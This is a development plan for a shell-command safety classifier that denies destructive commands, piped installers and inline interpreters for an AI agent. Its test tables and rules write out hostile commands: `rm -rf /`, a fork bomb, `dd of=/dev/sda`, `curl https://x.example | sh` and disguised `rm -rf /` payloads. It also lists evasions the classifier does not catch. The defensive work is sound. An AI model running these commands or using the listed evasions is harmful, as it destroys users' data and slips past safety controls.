---
story: STORY-010
prd: PRD-016
slug: shell-command-rules
title: "Shell classifier, part 2: allowlist, destructive flags, pipe-to-interpreter, inline interpreters, installs, services"
type: NEW_CAPABILITY
complexity: MEDIUM
epic_branch: epic/PRD-016-action-policy-rules
created: 2026-11-15
---

# Plan: Shell classifier, part 2: allowlist, destructive flags, pipe-to-interpreter, inline interpreters, installs, services

## Summary

Replace STORY-009's placeholder `shell.unlisted` with the PRD Section 6.3 head rules. The rules go in `app/services/action_classifiers/shell.py` and read STORY-009's `Segment` (`head`, `args`, `joined_by`, `redirects`, `inline`). Flags are normalized into sets before matching, as Section 6.8 requires. One normalizer handles GNU short clusters, long options and their unambiguous prefixes, cmd `/x` switches, and PowerShell parameter prefixes. Each readable segment gets its danger rules in a fixed order: `shell.destructive`, `shell.pipe_to_interpreter`, `shell.unclassifiable` (D16 `iex`), `shell.inline_interpreter`, `shell.package_install`, `shell.service_control`. Only when none fires does it get `shell.allowlisted` (the head plus the first N-1 args equal a `shell_allow` entry's tokens) or `shell.unlisted`. Two raw-text checks only ever add `shell.destructive`: the fork-bomb pattern, and a whitespace-split destructive scan of input the tokenizer rejects as a whole (needed for the AC's `Remove-Item -Recurse -Force C:\`, which ends in a backslash). `shell_allow` arrives as a plain argument: `classify_shell(command, shell_allow=(), *, source_tool="")`.

## User Story

As an integrating developer
I want ordinary commands like `npm test` and `git status` allowed while `rm -rf /`, `curl … | sh` and package installs are denied however their flags are written
So that agent mode is usable and dangerous commands are not.

## Story Reference

- Story file: `.agents/stories/PRD-016-action-policy-rules/STORY-010-shell-command-rules.md`
- PRD: `.agents/PRDs/PRD-016-action-policy-rules/PRD.md` (6.3 shell rows, 6.4, 6.6 `shell.allow`, 6.8, F3, Risk 2, Risk 3, D3, D5, D16)
- Interface consumed: `.agents/plans/PRD-016-action-policy-rules/completed/STORY-009-shell-tokenizer-and-unclassifiable.plan.md` ("The interface STORY-010 and STORY-013 consume", lines 143-191)
- Threat model: `.agents/spikes/PRD-016-action-policy-rules/threat-model.md:60` (S3, PowerShell/cmd gap)

## Metadata

| Field | Value |
|-------|-------|
| Type | NEW_CAPABILITY |
| Complexity | MEDIUM |
| Systems Affected | `app/services/action_classifiers/shell.py`, `tests/test_action_shell.py` |
| Story | STORY-010 |
| PRD | PRD-016 |
| Epic Branch | `epic/PRD-016-action-policy-rules` (commit directly on this branch) |

---

## Skills In Use

| Skill | Why it applies | Tasks affected |
|-------|---------------|----------------|
| (none) | Story `skills: []`. `.agents/skills/` holds only `frontend-design` (UI visual design), and this story has no UI. Read and judged not applicable | — |

---

## Parse facts verified during planning (repo `.venv`, Python 3.12, current `shell.py` @ 4b220ce)

I ran `parse_shell` on every AC input. These outputs drive the design:

| Input | `parse_shell` result | Consequence |
|---|---|---|
| `rm -rf x`, `-fr`, `-r -f`, `--recursive --force`, `-Rf` | one segment, head `rm`, args as written | Flag-set normalizer needed |
| `rm -r -fo x` | head `rm`, args `('-r','-fo','x')` | The POSIX cluster `-fo` contains `f`, so recursive+force already. PS reading not needed for `rm` |
| `:(){ :|:& };:` | 4 segments: `:(){` (unclassifiable), `:` (`|`), `}` (unclassifiable), `:` | Raw-text fork-bomb check needed (orchestrator note) |
| `Remove-Item -Recurse -Force C:\` (unquoted) | **whole input unclassifiable, detail `\`** (trailing backslash), no segments | Head rules never see it. A raw fallback scan is needed for the AC's `shell.destructive` (decision 6) |
| `pwsh -c "Remove-Item -Recurse -Force C:\"` | whole input unclassifiable `"` (`\"` escapes the quote) | Same fallback |
| `Remove-Item -Recurse -Force 'C:\'` | head `Remove-Item`, args `('-Recurse','-Force','C:\\')` | Head rule works |
| `rd /s /q C:\x` | head `rd`, args `('/s','/q','C:x')` (shlex ate `\`) | Switch `/s` is still visible |
| `cmd /c "rd /s /q C:\x"` | head `cmd`, args `('/c','rd /s /q C:\\x')`, `inline` None | Inner text scanned here (decision 5) |
| `pwsh -Command "Remove-Item …"` | head `pwsh`, args `('-Command', '<text>')` | Same |
| `BASH -c "ls"` | head `BASH`, **`inline` None** (`_POSIX_SHELLS` is matched case-sensitively, `shell.py:649`) | Fold the case at `shell.py:649` (Task 1) |
| `sh < x.sh` | head `sh`, args `()`, redirect `<` `x.sh` | Interpreter reading a script file through `<` |
| `cat x | xargs sh -c "y"` | 2nd segment head `sh`, joined `|`, `inline` set | Pipe and inline both fire |
| `Invoke-Expression $x`, `iex $x` | head as written, readable (only a `$` in the *head* is unclassifiable) | Head rule (D16) |
| `npm test -- --watch=false` | head `npm`, args `('test','--','--watch=false')` | Entry `npm test` matches `args[:1]` |

The fork-bomb regex `([^\s(){}|&;<>]+)\s*\(\s*\)\s*\{[^}]*?\1\s*\|\s*\1[^}]*\}` was checked. It matches `:(){ :|:& };:`, `:(){ :|: & };:`, `bomb(){ bomb|bomb& };bomb` and `f() { f | f & }; f`. It does not match `echo ok` or `f(){ g|g& };f`.

---

## Patterns to Follow

### Naming, module docstring, closed tables
```
// SOURCE: app/services/action_classifiers/shell.py:92-122
#: Operators that join segments (PRD-016 Section 6.8 step 3). `"\n"` is a newline.
SEPARATORS: frozenset[str] = frozenset({";", "&&", "||", "|", "|&", "&", "\n"})
...
# Section 6.3: a head that reads code from somewhere the classifier cannot see.
_EVAL_HEADS = frozenset({"eval", "source", "."})
_POSIX_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh"})
```
New tables follow this style: `#:` comments that cite the 6.3 row or D16, `frozenset`s, and a frozen dataclass for a per-head spec, as `_Wrapper` does (`shell.py:440-453`).

### Never raises; whole input as the target; detail capped
```
// SOURCE: app/services/action_classifiers/shell.py:723-739
def classify_shell(command: str, *, source_tool: str = "") -> tuple[Classification, ...]:
    target = command if isinstance(command, str) else ""
    op = Operation(kind="shell", target=target, source_tool=source_tool)
    try:
        ...
        return tuple(_flatten(parse_shell(command), op))
    except Exception:
        return (Classification("shell.unclassifiable", op, _first_word(command)),)
```
Every new `detail` goes through `_cap` (`shell.py:125-126`, at most 32 characters, T11).

### Configuration as a plain argument (purity)
```
// SOURCE: app/services/action_classifiers/sql.py:314-316
def classify_sql(
    statement: str, dialect: Optional[str], *, source_tool: str = ""
) -> tuple[Classification, ...]:
```
```
// SOURCE: app/services/action_config.py:190, 612-630
    shell_allow: tuple[str, ...]
...
def _check_shell_entry(source: str, entry: str) -> None:
    """Not empty, and no shell operator ... Multi-token heads (`npm test`) are fine; their matching is
    STORY-010's."""
```
Each entry is a raw string such as `"npm test"`. It is not empty and holds no `; & | $ \` < > ( )` or newline. Nothing splits it. STORY-010 splits it on whitespace.

### Tests (table-driven, literals, parametrize)
```
// SOURCE: tests/test_action_shell.py:54-55, 171-185
def _rules(cmd):
    return tuple(c.rule for c in classify_shell(cmd))

@pytest.mark.parametrize("cmd", [ "r''m -rf /", '"rm" -rf /', ... ])
def test_head_is_rm(cmd):
    assert _heads(cmd) == ["rm"]
    assert _rules(cmd) == ("shell.unlisted",)
```

### Purity guard (must still pass unchanged)
`tests/test_action_shell.py:561-574`: the only `app` import allowed in `shell.py` is `from app.services.action_classifiers import Classification, Operation, RuleId`. Also no `open(`, no `Path(`, no `settings`. STORY-010 adds no import beyond the stdlib (`re`, `shlex`, `dataclasses`, `typing`, already imported).

---

## Design decisions (for the implementer and the orchestrator)

1. **Signature.** `classify_shell(command, shell_allow=(), *, source_tool="")`. `shell_allow` is any iterable of `str` (the policy passes `ActionPolicy.shell_allow`, a `tuple[str, ...]`). The default `()` means nothing is allowlisted. That is the built-in policy's value (`action_config.py:178-180`), and it fails closed if a caller forgets it, so the existing `classify_shell(cmd)` calls stay valid. Entries are tokenized with `str.split()`, and a non-`str` or blank entry is skipped (the policy has validated them already, but the classifier never raises). STORY-013 will need the secret globs too. It extends this signature (a `policy`-like argument) and should not reorder it.

2. **Per-segment output, in order** (`_flatten` replaced). For each segment, left to right:
   1. the flattened `segment.inline` classifications (POSIX `-c`, STORY-009 recursion), unchanged;
   2. the classifications from the scanned PowerShell/cmd inner text (decision 5);
   3. **STORY-013's hook goes here**: embedded SQL/URL/secret classifications of this `Segment` (its `head`, `args`, `assignments`, `redirects`), before the head's own rule (PRD 6.4). Leave a comment that names it; no stub function;
   4. if `segment.unclassifiable` is set, `shell.unclassifiable` and nothing else, as today;
   5. otherwise the danger rules that fire, in this fixed order: `shell.destructive`, `shell.pipe_to_interpreter`, `shell.unclassifiable` (iex), `shell.inline_interpreter`, `shell.package_install`, `shell.service_control`. Non-grantable rules come first, so the first deny STORY-014 reports is the one no role can lift;
   6. only if no danger rule fired: `shell.allowlisted` when an entry matches, else `shell.unlisted`. Detail = head for both, as the STORY-009 placeholder did. PRD 6.3: allowlisted means "no other rule fires", so an allowlisted `npm` still gets `npm install x` as `shell.package_install`, and an allowlisted `rm` still gets `rm -rf /` as `shell.destructive`.

   After all segments come the raw-text checks (decision 6), appended last. What the parse read comes first, and what a raw check adds comes after. A whole-input failure still yields its one `shell.unclassifiable` first, so `test_whole_input_failure_is_one_classification` (`ls; echo $(x)`, nothing destructive) is unchanged.

3. **Head matching.** Danger rules compare `head.lower()`. Folding only adds denies: `RM -rf /` on Git Bash's case-insensitive filesystem is `rm`, and D16 wants PowerShell and cmd heads matched case-insensitively. **The allowlist compares exactly** (case-sensitive head, exact arg tokens), so folding never widens an allow. Flags are *not* case-folded for GNU tools (`-R` and `-r` are both recursive for `rm` by table). They are folded for PowerShell parameters and cmd switches.

4. **Flag normalization (PRD 6.8, "matched after normalization, not as strings").** Use one helper, `_flag_set(args, short, long) -> frozenset[str]`. `short` maps a letter to a canonical name. `long` maps a full long-option name to a canonical name. A `--name[=v]` matches every long option that `name` is a prefix of (GNU getopt accepts unambiguous prefixes, so `--rec` is `--recursive`; an ambiguous prefix is counted as all its matches, which is stricter). A `-abc` cluster contributes each known letter and ignores unknown ones. Scanning stops at `--`, and every word after it is a positional. `_positionals(args)` returns the words that do not start with `-`, plus everything after `--`. Use separate helpers for the Windows forms:
   - `_cmd_switches(args)`: the lowercase letters of `/x` words, with `/s/q` split into `s`, `q`;
   - `_ps_params(args, names)`: the set of `names` that some `-Word[:value]` (or `/Word`) arg is a case-insensitive prefix of. PowerShell binds unambiguous prefixes (D16, STORY-001 S3), and an ambiguous one is counted as all matches (stricter).

5. **The rules** (each one is a closed table near the top of the module, with a `#:` comment that cites the 6.3 row or D16):
   - **`shell.destructive`** (`_destructive(head_lower, args) -> Optional[str detail]`, also used by decision 6):
     - `rm`: flags `{r,R → recursive, f → force}` and `{--recursive, --force}`. Destructive if recursive and force, or recursive and any positional is a dangerous target. A **dangerous target** is a word that, after trailing `/*`, `\*`, `/` and `\` are stripped repeatedly, is empty (it was `/`, `//`, `/*`) or is one of `~`, `.`, `..`, `*`, `$HOME`, `${HOME}`, or a bare drive `X:`. The 6.3 list is `/ ~ * .`. The extras close trivial spellings (`~/`, `/*`, `C:\`) and are listed for STORY-020. `rm x` and `rm -r build` are not destructive (6.3 and the AC). `rm -r -fo x` is destructive through the POSIX cluster (`f`);
     - `mkfs` and `mkfs.*`: always;
     - `dd`: any arg whose lowercase form starts with `of=`;
     - `shred`: always;
     - `chmod`, `chown`: recursive (`-R`, `--recursive` and its prefixes) and a dangerous target;
     - PowerShell `remove-item`, `ri`: `_ps_params(args, {"recurse"})` non-empty (D16: "`Remove-Item` with `-Recurse`"), so `-Rec`, `-r` and `-Recurse:$true` all count;
     - cmd/PowerShell `rd`, `rmdir`, `del`, `erase`: cmd switch `s`, or the PS `-Recurse` prefix (in PowerShell these are aliases of `Remove-Item`). POSIX `rmdir` has no `-r…` and no `/s` options, so this cannot misfire on a real POSIX `rmdir`;
     - `format-volume`: always (D16).
     - Detail: the head plus the words that matched, as written (`rm -rf`, `rm -r /`, `dd of=/dev/sda`, `Remove-Item -Recurse`), capped.
   - **`shell.pipe_to_interpreter`**: `joined_by in {"|", "|&"}` and the folded head is an interpreter. Interpreters are `sh bash zsh dash ksh node perl ruby php pwsh`, plus `python` matching `python(\d+(\.\d+)*)?` (the story's `python3.*`), plus `powershell` and `cmd`. The last two are D16's shells, and piping into them runs stdin. The rule fires whatever the arguments are (6.3, "a pipe whose downstream head is an interpreter"). `echo cm0= | base64 -d | sh` fires on the `sh` segment (6.8, "a base64 payload is not decoded"). Detail `| sh`.
   - **`shell.unclassifiable` (D16)**: folded head `invoke-expression` or `iex`. Detail = head.
   - **`shell.inline_interpreter`** (6.3, 6.8, D16; detail = head plus the triggering word, for example `bash -c`, `python -c`, `node -e`, `pwsh -Command`, `cmd /c`, `python x.py`):
     - POSIX shells: `segment.inline is not None` (a `-c` script, recursed by STORY-009), **or** a script positional (`bash x.sh`, using STORY-009's option walk), **or** a `<` redirect (`sh < x.sh`). The story says "an interpreter given a script file is `shell.inline_interpreter` (contents unreadable, PRD 6.8)". `bash`, `bash -l` and `sh -s` with no script positional and no redirect do not fire. (Piped, they fire `pipe_to_interpreter`.) Implement this by making `_inline_script` also report whether a positional exists (one extra return value; `shell.py:587-611`);
     - `python*`: a short cluster containing `c` before the first positional, or a first positional (a script file). `-m MODULE` is **not** inline (decision 9, open question 2). `python -m pip install x` is `shell.package_install` instead;
     - `node`: `-e`, `-p`, `--eval`, `--print` (and their `=` forms), or a positional;
     - `perl`: a cluster with `e` or `E` (`-ne`, `-lpe`), or a positional. `ruby`: a cluster with `e`, or a positional. `php`: a cluster with `r`, `-f`, or a positional;
     - `pwsh`, `powershell`: a PS parameter that is a prefix of `command`, `commandwithargs`, `encodedcommand` or `file` (and the alias `-ec`), or any positional (pwsh reads one as `-File`, Windows PowerShell as `-Command`). `pwsh -NoProfile` alone does not fire;
     - `cmd`: a word whose lowercase form starts with `/c` or `/k` (`/c`, `/C`, `/cdir`), or a `<` redirect;
     - any interpreter with a `<` redirect.
     - The **inner text of PowerShell/cmd is not POSIX shell.** It is the args after the triggering word joined with `" "`, plus an attached remainder (`/cdir` becomes `dir`). It is parsed with `parse_shell(inner, parse.depth + 1)`, and from that parse **only** `shell.destructive` (per segment, plus decision 6's fallback when the whole inner parse fails) and the `iex` `shell.unclassifiable` are emitted. Emitting the inner parse's other `shell.unclassifiable` results would turn every PowerShell `$(...)` or `{ }` into a non-grantable deny for a role D16 meant to allow with `action:shell:exec`. This is the "only where the inner text is shell" clause of the STORY-009 interface. `-EncodedCommand` and `-File` give no readable inner text. They are only `shell.inline_interpreter`. Depth is bounded by STORY-009's `MAX_DEPTH`.
     - The inner text of `python -c`, `node -e`, `perl -e`, `ruby -e` and `php -r` is not parsed. It is another language. `python -c "import os; os.system('rm -rf /')"` is `shell.inline_interpreter` only (grantable), which is listed as a risk.
   - **`shell.package_install`** (6.3, AC 3): fires when any positional before `--` is in the head's subcommand set. "Any positional", not "the first one", so `npm --prefix . install x` cannot hide behind an allowlisted `npm`. The cost is that `npm run add` is classed as an install, still deny and grantable as before. Head table: `npm` {`install`, `i`, `in`, `ins`, `inst`, `insta`, `instal`, `isnt`, `isnta`, `isntal`, `isntall`, `add`} (npm's own aliases); `pnpm` {`add`}; `yarn` {`add`, `global`}; `pip`, `pip3` and `pip3.*` {`install`}; `uv` {`add`} and `uv pip install`; `apt`, `apt-get`, `aptitude` with any arguments (6.3's `apt*`); `brew` {`install`}; `gem` {`install`}; `cargo` {`install`}; `go` {`install`}. Also `python* -m pip install`. Detail: head plus subcommand (`npm install`).
   - **`shell.service_control`** (6.3, AC 3): `systemctl`, `service`, `launchctl`, `reboot` and `shutdown` with any arguments. `docker` and `podman` when a positional is in {`run`, `rm`, `kill`, `stop`}, so `docker container rm x` is covered. `kubectl` when a positional is in {`delete`, `apply`}. Detail: head, or head plus subcommand.
   - **Allowlist** (6.6, AC 4): entry tokens `t = entry.split()`. The entry matches if `t[0] == segment.head` and `segment.args[:len(t)-1] == tuple(t[1:])`. `npm test -- --watch=false` matches `npm test`. `npm run deploy` does not. Two safety exceptions (open question 1): a segment whose `wrappers` include `sudo` or `doas`, or that has `assignments` (`GIT_SSH_COMMAND='rm -rf /' git fetch`, `LD_PRELOAD=x ls`), is **never** `shell.allowlisted` and falls to `shell.unlisted`.

6. **Raw-text checks** (orchestrator note; they only add `shell.destructive`):
   - **Fork bomb**: run the regex above on the input with CRLF/CR normalized to LF, whatever the parse result. Detail = the match, capped.
   - **Unreadable-input fallback**: only when `parse.unclassifiable` is set (the whole input rejected, so no segment exists). Split the text on `[;&|\n]+` and each piece on whitespace, strip `'` and `"` from each word, then skip leading `NAME=value` words and the bare names of `_WRAPPERS`. Run `_destructive(_basename(word0).lower(), rest)` on what remains. This turns the AC's unquoted `Remove-Item -Recurse -Force C:\` into (`shell.unclassifiable` `\`, `shell.destructive` `Remove-Item -Recurse`). It also gives `rm -rf / $(x)` its `shell.destructive` in the audit. It is a best-effort guess that can only add a non-grantable deny to input that is already a non-grantable deny, so it never loosens anything. The module docstring says so.

7. **Small parse-layer change.** `shell.py:649`: `head in _POSIX_SHELLS` becomes `head.lower() in _POSIX_SHELLS`, so `BASH -c 'rm -rf /'` is recursed into (inner `shell.destructive`) and not only marked inline. Without it, the inner command would be unread under a grantable rule. Nothing else in STORY-009's parse changes. `Segment`, `ShellParse` and `Redirect` keep their fields (`test_interface_fields`).

8. **Docstrings.** Update the module docstring: the "Inline interpreters" paragraph (`shell.py:40-44`), the "Until STORY-010 … placeholder" paragraph (`shell.py:69-73`) and the purity paragraph (`shell.py:80-82`, `shell_allow` now arrives). Add a "Head rules (STORY-010)" section that lists decisions 2-6 with their PRD citations, and the "What this does not read" list from the risks below.

9. **`python -m`** is not a script file. `python -m pytest` is the common way to run an installed tool, and treating it as inline would deny it even when a deployment allowlists `python -m pytest`, because danger rules come before the allowlist. A module is installed code, like the `pytest` head itself. Open question 2.

---

## Files to Change

| File | Action | Purpose |
|------|--------|---------|
| `app/services/action_classifiers/shell.py` | UPDATE | Head-rule tables, flag normalizers, `_destructive`, per-segment rules, PowerShell/cmd inner scan, raw-text checks, the `shell_allow` argument, the `_POSIX_SHELLS` case fold, docstrings |
| `tests/test_action_shell.py` | UPDATE | Table-driven tests per rule and AC. Update the four STORY-009 assertions that asserted the placeholder (each with a `PRD-016 STORY-010` comment) |

No new files. No other module changes: `action_config`, the adapters and `__init__.py` stay untouched, since every rule id already exists in `RuleId` (`__init__.py:46-80`).

---

## Tasks

Execute in order. Each task is atomic and verifiable.

### Task 1: Parse-layer touch-ups

- **File**: `app/services/action_classifiers/shell.py`
- **Action**: UPDATE
- **Implement**: (a) the `head.lower() in _POSIX_SHELLS` fold at line 649 (decision 7). (b) `_inline_script` (lines 587-611) also returns whether a script positional exists when there is no `-c`. Its one caller at line 650 ignores that value. The classification code needs it, so either store nothing new on `Segment` and recompute it in the rule code by calling the same helper on `(segment.argv, segment.head_index)`, or add a sibling helper. **Do not add a `Segment` field** (`test_interface_fields` pins them).
- **Mirror**: `shell.py:587-611`.
- **Validate**: `PYTHONUTF8=1 .venv/Scripts/python -m pytest tests/test_action_shell.py -q -p no:cacheprovider` is still green except the four placeholder assertions, which Task 5 updates.

### Task 2: Flag normalizers and rule tables

- **File**: `app/services/action_classifiers/shell.py`
- **Action**: UPDATE
- **Implement**: `_flag_set`, `_positionals`, `_cmd_switches`, `_ps_params`, `_is_dangerous_target` (decision 4). Closed tables: `_INTERPRETERS` (plus the `python` regex), `_PS_INLINE_PARAMS`, `_PACKAGE_INSTALL` (head to subcommands; `None` means any arguments), `_SERVICE_CONTROL` (the same shape), and `_RM_SHORT`/`_RM_LONG`/`_CH_SHORT`/`_CH_LONG`. Each table gets a `#:` comment citing the 6.3 row or D16.
- **Mirror**: `_Wrapper` and `_WRAPPERS` (`shell.py:440-511`) for the style of a per-head option table.
- **Validate**: import works (`.venv/Scripts/python -c "import app.services.action_classifiers.shell"`).

### Task 3: `_destructive` and the per-segment rules

- **File**: `app/services/action_classifiers/shell.py`
- **Action**: UPDATE
- **Implement**: `_destructive(head_lower, args) -> Optional[str]` (decision 5). Then `_segment_rules(segment, depth, allow_tokens, op) -> list[Classification]`, which applies decision 2 steps 2-6, including the PowerShell/cmd inner scan through `parse_shell(inner, depth + 1)` with only destructive and iex emitted. Add the STORY-013 hook comment at step 3. Then `_allowlisted(segment, allow_tokens) -> bool`, with the sudo/doas and assignments exceptions.
- **Validate**: Task 5's tests.

### Task 4: `_flatten`, the raw checks and `classify_shell`

- **File**: `app/services/action_classifiers/shell.py`
- **Action**: UPDATE
- **Implement**: `_flatten(parse, op, allow_tokens)` calls `_segment_rules` per segment and keeps the inline-first order. `classify_shell(command, shell_allow=(), *, source_tool="")` tokenizes the allow entries inside the `try`, flattens the parse, then appends the fork-bomb and unreadable-input fallback classifications (decision 6). Keep `_flatten`'s inline recursion passing `allow_tokens` (inner segments can be `shell.allowlisted`; the outer `shell.inline_interpreter` still denies). Update the docstrings (decision 8).
- **Mirror**: `shell.py:698-739`.
- **Validate**: `.venv/Scripts/python -c "from app.main import app; print('OK')"`.

### Task 5: Tests

- **File**: `tests/test_action_shell.py`
- **Action**: UPDATE
- **Implement**:
  - Update the file docstring (lines 9-14: the placeholder is gone, and STORY-010 is now covered).
  - **Modified STORY-009 assertions**, each with a comment `# PRD-016 STORY-010 (decision N): ...`:
    1. `test_head_is_rm` (lines 171-185): add an expected-rule column. `r''m -rf /`, `"rm" -rf /`, `\rm -rf /` and `/usr/bin/rm -rf /` give `("shell.destructive",)`. `"C:\Program Files\x\rm.exe" x`, `rm.EXE x` and `./bin/rm x` give `("shell.unlisted",)`;
    2. `test_depth_three_is_readable_and_four_is_not` (line 304) becomes `("shell.unlisted",) + ("shell.inline_interpreter",) * MAX_DEPTH`;
    3. `test_placeholder_until_story_010` (lines 497-499): rename it to `test_unlisted_head_with_no_allowlist`, with the same assertion. The rename is safe because the file is not in `merge-base main HEAD`, so the census in `tests/test_pii_redaction_integration.py:517-539` does not see it;
    4. `test_inline_classifications_come_before_the_segment_own` (lines 502-505) becomes `("shell.unclassifiable", "shell.inline_interpreter")`, with details `["cat", "wc", "bash -c", "ls"]`.
    5. Fork-bomb comment at line 371: drop "(STORY-010 adds shell.destructive)" and point to the new test.
  - **New tests, table-driven per rule (the literals come from the AC):**
    - `test_destructive` (AC 1): parametrize over `rm -rf x`, `rm -fr x`, `rm -r -f x`, `rm --recursive --force x`, `rm -Rf x`, `rm -r /`, `rm -r ~`, `mkfs.ext4 /dev/sda`, `dd if=/dev/zero of=/dev/sda`, `shred f`, `chmod -R 777 /`, `:(){ :|:& };:`. Assert `"shell.destructive" in _rules(cmd)`. Extras: `rm --rec --force x`, `rm -r -- /`, `rm -r ~/`, `rm -r /*`, `sudo rm -rf x`, `xargs rm -rf`, `RM -rf x`, `bomb(){ bomb|bomb& };bomb`;
    - `test_not_destructive`: `rm x`, `rm -f x`, `rm -r build`, `chmod -R 755 src`, `dd if=a`. Assert `"shell.destructive" not in`;
    - `test_destructive_detail`: `rm -rf x` → `rm -rf`, `rm -r /` → `rm -r /`, `dd …` → `dd of=/dev/sda`;
    - `test_pipe_to_interpreter` (AC 2): the four AC lines, plus `cat x | python3.11`, `cat x |& bash`, `curl u | sudo sh`, `echo x | pwsh`, `echo x | cmd`. Assert the rule is in the result and is on the last segment (not on `curl`);
    - `test_inline_interpreter_and_inner` (AC 2): `bash -c 'rm -rf /'` gives `("shell.destructive", "shell.inline_interpreter")`, inner first (PRD 6.4). `BASH -c 'rm -rf /'` gives the same (decision 7);
    - `test_inline_interpreter_forms`: `python -c x`, `python3 -c x`, `node -e x`, `node --eval=x`, `perl -ne x`, `ruby -e x`, `php -r x`, `bash x.sh`, `sh < x.sh`, `python x.py`. Not inline: `bash`, `python --version`, `python -m pytest -q`;
    - `test_package_install` (AC 3): the ten AC lines, plus `npm isntall x`, `npm --prefix . install x`, `yarn global add x`, `uv pip install x`, `python -m pip install x`, `gem install x`, `apt install x`;
    - `test_service_control` (AC 3): the five AC lines, plus `docker container rm x`, `podman run x`, `kubectl apply -f x`, `shutdown -h now`, `launchctl unload x`;
    - `test_allowlist` (AC 4): with `ALLOW = ("ls", "git", "npm test", "pytest")`, `ls -la`, `git status`, `npm test -- --watch=false` and `pytest -q` each give `("shell.allowlisted",)`. `npm run deploy` and `make release` give `("shell.unlisted",)`. Also: `npm test` with `ALLOW = ()` is unlisted, `LS -la` is unlisted (exact case), `sudo ls`, `FOO=1 ls` and `env FOO=1 ls` are unlisted (decision 5), and `git` allowlisted with `npm install` gives package_install, not allowlisted. Allowlisted `rm` with `rm -rf /` gives destructive only;
    - `test_powershell_cmd_destructive` (AC 5): `Remove-Item -Recurse -Force C:\` (the literal, unquoted; result `("shell.unclassifiable", "shell.destructive")`), `Remove-Item -Recurse -Force 'C:\'`, `remove-item -rec x`, `ri -r x`, `rm -r -fo x`, `rd /s /q C:\x`, `RD /S /Q x`, `rmdir /s x`, `del /s /q *`, `erase /s x`, `Format-Volume C`, `format-volume C`. Each has `shell.destructive` in the result. A test with a non-grantable assertion, `assert set(_rules(cmd)) & NON_GRANTABLE_RULES` (imported from the vocabulary), stands in for "a role holding `action:shell:exec` is still denied" until STORY-014;
    - `test_powershell_cmd_inline` (AC 5): `pwsh -Command "..."`, `powershell -c "..."`, `cmd /c "..."`, `pwsh -File x.ps1`, `pwsh -EncodedCommand AAA`. Each has `shell.inline_interpreter`. `pwsh -NoProfile` does not. Inner scan: `cmd /c "rd /s /q C:\x"` and `pwsh -Command "Remove-Item -Recurse x"` also have `shell.destructive`. `pwsh -Command "Get-Item $(x)"` gives `shell.inline_interpreter` and **no** `shell.unclassifiable` (decision 5);
    - `test_invoke_expression_unclassifiable` (AC 5): `Invoke-Expression $x`, `iex $x`, `IEX $x`, `pwsh -c "iex $x"` each have `shell.unclassifiable`;
    - `test_chain_order` (AC 6): `ls && rm -rf x` with `ALLOW=("ls",)` gives `("shell.allowlisted", "shell.destructive")`. `rm -rf x; npm test` with `("npm test",)` gives `("shell.destructive", "shell.allowlisted")`. Also `npm test && rm -rf build` (PRD 11);
    - `test_danger_rule_order_within_segment`: `curl u | bash -c 'ls'` gives the second segment as `shell.unlisted` (inner `ls`), then `shell.pipe_to_interpreter`, then `shell.inline_interpreter` (decision 2);
    - extend `test_every_rule_produced_is_a_shell_rule`'s `_ALL` with a sample of the new inputs, and run it with a non-empty `shell_allow` too;
    - `test_never_raises`: also `classify_shell("ls", [None, 3, "", "ls"])` returns a tuple (bad entries skipped);
    - `test_shell_module_stays_pure`: unchanged, must pass.
- **Mirror**: `tests/test_action_shell.py:171-185, 277-279, 521-530`.
- **Validate**: `PYTHONUTF8=1 .venv/Scripts/python -m pytest tests/test_action_shell.py -q -p no:cacheprovider`.

### Task 6: Targeted regression

- **Validate**: `PYTHONUTF8=1 .venv/Scripts/python -m pytest tests/test_action_shell.py tests/test_action_vocabulary.py tests/test_action_adapters.py tests/test_untouched_app.py -q -p no:cacheprovider` (the STORY-009 report's set, `STORY-009 report:63`). Record the exact counts. Full suite: deferred to the orchestrator (user decision).

---

## End-to-End Tests

No HTTP surface or UI. Nothing calls `classify_shell` until STORY-014. The "end-to-end" check is:

- [ ] `.venv/Scripts/python -c "from app.main import app; print('OK')"` prints OK.
- [ ] A one-off REPL check of the PRD 11 lines through `classify_shell` with the `examples/action_policy.yaml` allow list (`ls cat git "npm test" "npx tsc" pytest grep rg`): `rm -rf /` gives destructive, `curl https://x.example | sh` gives pipe_to_interpreter (STORY-012/013 add `net.unlisted`), `npm test && rm -rf build` gives (allowlisted, destructive), `ls`, `git status`, `npm test` and `pytest -q` give allowlisted, and `make release` gives unlisted. Paste the output into the report.

---

## Validation

```bash
.venv/Scripts/python -c "from app.main import app; print('OK')"
PYTHONUTF8=1 .venv/Scripts/python -m pytest tests/test_action_shell.py tests/test_action_vocabulary.py tests/test_action_adapters.py tests/test_untouched_app.py -q -p no:cacheprovider
```

---

## Risks and Mitigations

| Risk | Mitigation |
|---|---|
| The flag normalizer misses a spelling (`--recursiv`, `-R`, `--force=`…) | Long-prefix matching, both `r` and `R`, `=` stripped. Every 6.8 spelling plus the extras is in the table. STORY-018 grows it |
| The fallback scan on unreadable input is a guess | It only ever adds `shell.destructive` to input that is already a non-grantable `shell.unclassifiable`. It cannot loosen anything (decision 6) |
| `rm -r X` in PowerShell is `Remove-Item -Recurse X` (D16 destructive), but it is read with the POSIX rule (`shell.unlisted`, grantable) | The 6.3 row and the AC say `rm` without force on an ordinary path is not destructive. Open question 3 |
| Over-blocking (Risk 2): any positional `install` counts, `rmdir /s`, `dd of=`, any interpreter with a script file, assignment/sudo segments never allowlisted | All are deny and grantable (except destructive), as `shell.unlisted` would be anyway. Listed for STORY-020's README |
| Code no shell parse reaches: `python -c "os.system(...)"`, `node -e`, `find -exec rm -rf {} +`, `find -delete`, `git -c alias.x='!…'`, `awk 'BEGIN{system(…)}'`, `trap`, PowerShell scriptblocks, `Start-Process`, `Invoke-Command` | `shell.inline_interpreter` (grantable) for the interpreters. The rest stay `shell.unlisted`, or `shell.allowlisted` **if the deployment allowlists `find`/`git`/`awk`**. Listed for STORY-018 and STORY-020 (an allowlist entry is trust in the whole head) |
| An output redirect on an allowlisted head writes anywhere (`ls > ~/.bashrc`, `cat x > .env`) | Not this story: the redirect targets are on `Segment.redirects` for STORY-013 to route to STORY-011's `classify_write`. Flagged for the orchestrator |
| PowerShell/cmd inner text read as POSIX misreads | Only `shell.destructive` and `iex` are taken from it (decision 5). Everything else in it is dropped, and the outer `shell.inline_interpreter` stands |
| Heads not in the tables (`format`, `diskpart`, `Clear-Disk`, `Stop-Computer`, `winget/choco install`, `dnf/yum/apk/pacman`, `halt`, `poweroff`, `npm ci`, `go get`, `deno`, `bun`, `py`) | Deny by default as `shell.unlisted`. Open question 4 |

---

## Left for later stories (do not implement here)

